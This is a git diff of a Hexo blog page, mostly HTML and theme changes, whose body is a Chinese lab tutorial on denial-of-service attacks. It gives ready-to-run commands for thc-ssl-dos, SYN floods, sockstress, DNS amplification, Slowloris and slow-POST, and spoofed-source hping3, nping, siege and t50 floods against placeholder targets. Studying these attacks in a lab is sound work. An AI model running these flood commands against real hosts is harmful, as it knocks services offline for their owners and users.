@@ -237,75 +237,12 @@ oc&amp;#x2F">
         </li>
         
         
-        <li><div class="divider"></div></li>
-        <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
-                <i class="fab fa-github-square fa-fw"></i>Fork Me
-            </a>
-        </li>
-        
     </ul>
 </div>
 
 
         </div>
 
-        
-            <style>
-    .nav-transparent .github-corner {
-        display: none !important;
-    }
-
-    .github-corner {
-        position: absolute;
-        z-index: 10;
-        top: 0;
-        right: 0;
-        border: 0;
-        transform: scale(1.1);
-    }
-
-    .github-corner svg {
-        color: #0f9d58;
-        fill: #fff;
-        height: 64px;
-        width: 64px;
-    }
-
-    .github-corner:hover .octo-arm {
-        animation: a 0.56s ease-in-out;
-    }
-
-    .github-corner .octo-arm {
-        animation: none;
-    }
-
-    @keyframes a {
-        0%,
-        to {
-            transform: rotate(0);
-        }
-        20%,
-        60% {
-            transform: rotate(-25deg);
-        }
-        40%,
-        80% {
-            transform: rotate(10deg);
-        }
-    }
-</style>
-
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
-   data-tooltip="Fork Me" data-position="left" data-delay="50">
-    <svg viewBox="0 0 250 250" aria-hidden="true">
-        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
-        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
-              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
-        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
-              fill="currentColor" class="octo-body"></path>
-    </svg>
-</a>
         
     </nav>
 
@@ -560,15 +497,15 @@ oc&amp;#x2F">
 <h2 id="DOS拒绝服务攻击"><a href="#DOS拒绝服务攻击" class="headerlink" title="DOS拒绝服务攻击"></a>DOS拒绝服务攻击</h2><h2 id="DDOS分布式拒绝服务攻击"><a href="#DDOS分布式拒绝服务攻击" class="headerlink" title="DDOS分布式拒绝服务攻击"></a>DDOS分布式拒绝服务攻击</h2><p>tcp三次握手</p>
 <p>目前这种攻击无解<br>一般大佬的防御（用钱）</p>
 <h2 id="实验进行DOS攻击"><a href="#实验进行DOS攻击" class="headerlink" title="实验进行DOS攻击"></a>实验进行DOS攻击</h2><h3 id="kali的更新源设置为阿里云的："><a href="#kali的更新源设置为阿里云的：" class="headerlink" title="kali的更新源设置为阿里云的："></a>kali的更新源设置为阿里云的：</h3><p>目录&#x2F;etc&#x2F;apt&#x2F;source.list，下载到本机</p>
-<pre><code>deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+<pre class=" language-bash"><code class="language-bash">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
 deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
 
-# 如下图：
+<span class="token comment" spellcheck="true"># 如下图：</span>
 </code></pre>
 <p><img src="/2022/03/24/android/image-20220111160404450.png" alt="image-20220111160404450"></p>
 <p>设置完成后再把文件放回kali里</p>
 <p>然后在kali命令行：</p>
-<pre><code>apt-get update    # 更新
+<pre class=" language-Linux"><code class="language-Linux">apt-get update    # 更新
 
 apt-get install thc-ssl-dos    # 安装软件
 </code></pre>
@@ -579,28 +516,30 @@ apt-get install thc-ssl-dos    # 安装软件
 <p><img src="/2022/03/24/android/image-20220111160706009.png" alt="image-20220111160706009"></p>
 <p>用live模式打开parrot：</p>
 <p>用bitvise连接。</p>
-<pre><code>uname -a  # 查看相关
+<pre class=" language-Linux"><code class="language-Linux">uname -a  # 查看相关
 </code></pre>
 <h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS:"></a>DOS:</h2><h4 id="ssl-dos"><a href="#ssl-dos" class="headerlink" title="ssl-dos:"></a><strong>ssl-dos</strong>:</h4><p>服务器每次会处理300次&#x2F;s的ssl请求<br>这种攻击方法和传统攻击不一样，使用普通带宽也可以考虑打30G带宽的服务器</p>
-<p><code>apt-get install thc-ssl-dos</code>安装</p>
+<p>安装</p>
+<pre class=" language-Linux"><code class="language-Linux">apt-get install thc-ssl-dos
+</code></pre>
 <p>目标是打击https的网站：</p>
-<pre><code>thc-ssl-dos [目标ip] [目标ssl端口:443] --accept
+<pre class=" language-Linux"><code class="language-Linux">thc-ssl-dos [目标ip] [目标ssl端口:443] --accept
 </code></pre>
 <h4 id="syn-flood"><a href="#syn-flood" class="headerlink" title="syn flood:"></a>syn flood:</h4><p>syn洪水攻击</p>
-<pre><code>先安装：
+<pre class=" language-Linux"><code class="language-Linux">先安装：
 apt install python-scapy
 apt install python3-scapy
 </code></pre>
-<pre><code>从gethub上下载：
+<pre class=" language-Linux"><code class="language-Linux">从gethub上下载：
 git clone https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool.git
 cd Python-SYN-Flood-Attack-Tool
 </code></pre>
-<pre><code>ls
+<pre class=" language-Linux"><code class="language-Linux">ls
 ls -la
 chmod 777 ./*
 # 更改执行权限
 </code></pre>
-<pre><code>用Python去运行：
+<pre class=" language-Linux"><code class="language-Linux">用Python去运行：
 python3 py3_synflood_cmd.py -t [目标ip：10.20.30.40] -p 8080 -c 5
 python3 py3_SYN-Flood.py
 python SYN-Flood.py
@@ -610,11 +549,11 @@ python SYN-Flood.py
 <p><img src="/2022/03/24/android/image-20220111163825703.png" alt="image-20220111163825703"></p>
 <p>针对tcp服务，耗尽目标资源，建立大量的sock连接，不消耗网络资源<br>完成tcp3次握手，最后ack大小为0（即客户端不接收数据）<br>攻击者损耗很小<br>异步攻击，所以一台设备可以造成很大的效果<br>windows窗口实现流控（流量控制）</p>
 <p>需要python2环境并且安装scapy</p>
-<pre><code>./sockstress.py [目标ip] [端口号] [线程]
+<pre class=" language-Linux"><code class="language-Linux">./sockstress.py [目标ip] [端口号] [线程]
 </code></pre>
 <h4 id="dns放大攻击"><a href="#dns放大攻击" class="headerlink" title="dns放大攻击:"></a>dns放大攻击:</h4><p>发送给dns的数据包94<br>返回的数据包大小160+</p>
 <p>典型的流量放大攻击<br>单机带宽优势，以小汇多<br>利用协议的特性放大流量</p>
-<pre><code>apt-get install dnsutils
+<pre class=" language-Linux"><code class="language-Linux">apt-get install dnsutils
 # 安装dig命令
 
 dig ANY qq.com @[dns的ip]
@@ -622,7 +561,7 @@ dig ANY [目标域名（外网）] @[dns的服务器地址ip]
 # 利用回包判断dns服务器是否会被利用
 </code></pre>
 <p><img src="/2022/03/24/android/image-20220111164722176.png" alt="image-20220111164722176"></p>
-<h4 id="慢速攻击-打击网站有效果"><a href="#慢速攻击-打击网站有效果" class="headerlink" title="慢速攻击(打击网站有效果):"></a>慢速攻击(打击网站有效果):</h4><pre><code>apt-get install openssl
+<h4 id="慢速攻击-打击网站有效果"><a href="#慢速攻击-打击网站有效果" class="headerlink" title="慢速攻击(打击网站有效果):"></a>慢速攻击(打击网站有效果):</h4><pre class=" language-Linux"><code class="language-Linux">apt-get install openssl
 apt-get install libssl-dev
 apt-get install slowhttptest
 </code></pre>
@@ -630,7 +569,7 @@ apt-get install slowhttptest
 <p><strong>Slowloris,slow http post</strong>攻击<br>耗尽应用并发的连接池，类似于http层的<strong>syn_flood</strong><br>http协议<strong>默认</strong>在服务端全部接收到请求之后才开始处理，如果客户发送的数据包慢速而且不完整，就会导致Dos</p>
 <p><strong>Slowloris攻击</strong>:完整的http结尾是\r\n\r\n，它的攻击结尾\r\n<br><strong>slow http post</strong>攻击:http头部content-length声明长度，但是body缓慢发送</p>
 <p><strong>slow http post</strong>慢速攻击(<strong>RUDY</strong>):</p>
-<pre><code>slowhttptest -c 2000 -B -g -o body_states -i 110 -r 200 -s 8192 -t FAKEVERB -u http://192.168.1.214 -x 10 -p 3
+<pre class=" language-Linux"><code class="language-Linux">slowhttptest -c 2000 -B -g -o body_states -i 110 -r 200 -s 8192 -t FAKEVERB -u http://192.168.1.214 -x 10 -p 3
 
 # -c 并发连接数
 # -H 默认攻击
@@ -648,10 +587,10 @@ apt-get install slowhttptest
 # -p 默认几秒没相应即判定已死亡
 </code></pre>
 <p><strong>Slowloris</strong>攻击：</p>
-<pre><code>slowhttptest -c 2000 -H -g -o my_header_states -i 10 -r 1000 -t GET -u http://192.168.1.214 -x 24 -p 3
+<pre class=" language-Linux"><code class="language-Linux">slowhttptest -c 2000 -H -g -o my_header_states -i 10 -r 1000 -t GET -u http://192.168.1.214 -x 24 -p 3
 </code></pre>
 <h3 id="hping3"><a href="#hping3" class="headerlink" title="hping3:"></a>hping3:</h3><p>定制发送任何的数据包</p>
-<pre><code>-a   #伪造源地址
+<pre class=" language-Linux"><code class="language-Linux">-a   #伪造源地址
 -q   #不返回
 -n   #不解析域名
 -s   #源端口
@@ -660,28 +599,28 @@ apt-get install slowhttptest
 --flood   #以flood方式攻击
 </code></pre>
 <p>syn-flood</p>
-<pre><code>hping3 -c 3000 -d 120 -S -w 64 -p 80 --flood --rand-source [目标ip]
+<pre class=" language-Linux"><code class="language-Linux">hping3 -c 3000 -d 120 -S -w 64 -p 80 --flood --rand-source [目标ip]
 hping3 -S -P -p 80 --flood --rand-source [目标ip]
 </code></pre>
 <p>tcp-flood</p>
-<pre><code>hping3 -SARUFP -p 80 --flood --rand-source [目标ip]
+<pre class=" language-Linux"><code class="language-Linux">hping3 -SARUFP -p 80 --flood --rand-source [目标ip]
 </code></pre>
 <p>icmp-flood</p>
-<pre><code>hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood [目标ip]
+<pre class=" language-Linux"><code class="language-Linux">hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood [目标ip]
 </code></pre>
 <p>udp-flood</p>
-<pre><code>hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood [目标ip]
+<pre class=" language-Linux"><code class="language-Linux">hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood [目标ip]
 </code></pre>
 <p>LAND<br>特殊的syn-flood攻击<br>源地址和目的地址都是受害者，自己和自己完成3次握手</p>
-<pre><code>hping3 -n -a [目标ip] -S -d 100 -p 80 --flood [目标ip]
+<pre class=" language-Linux"><code class="language-Linux">hping3 -n -a [目标ip] -S -d 100 -p 80 --flood [目标ip]
 </code></pre>
 <p>TCP全链接DOS攻击</p>
-<pre><code>nping --tcp-connect --rate=10000 -c 10000000 -q [目标ip]
+<pre class=" language-Linux"><code class="language-Linux">nping --tcp-connect --rate=10000 -c 10000000 -q [目标ip]
 </code></pre>
-<h3 id="siege攻击："><a href="#siege攻击：" class="headerlink" title="siege攻击："></a>siege攻击：</h3><pre><code>siege -i -c 1000000 [目标ip] -A httttttp
+<h3 id="siege攻击："><a href="#siege攻击：" class="headerlink" title="siege攻击："></a>siege攻击：</h3><pre class=" language-Linux"><code class="language-Linux">siege -i -c 1000000 [目标ip] -A httttttp
 </code></pre>
 <h3 id="t50压力测试："><a href="#t50压力测试：" class="headerlink" title="t50压力测试："></a>t50压力测试：</h3><p>网络协议支持全面</p>
-<pre><code>t50 -h    #可以查看参数
+<pre class=" language-Linux"><code class="language-Linux">t50 -h    #可以查看参数
 
 t50 [目标网关] --flood --turbo -S --protocol TCP --dport 22
 
@@ -1446,16 +1385,20 @@ $(function () {
     
 
     <!-- 雪花特效 -->
-     
-        <script type="text/javascript">
-            // 只在桌面版网页启用特效
-            var windowWidth = $(window).width();
-            if (windowWidth > 768) {
-                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
-            }
-        </script>
     
+	
+	<!-- 冒泡 -->
+	
+		<script type="text/javascript">
+			// 只在桌面版网页启用特效
+			var windowWidth = $(window).width();
+			document.write(
+				'<script type="text/javascript" src="/libs/others/buble.js"><\/script>'
+			);
+		</script>
+	
 
+	
     <!-- 鼠标星星特效 -->
     
 
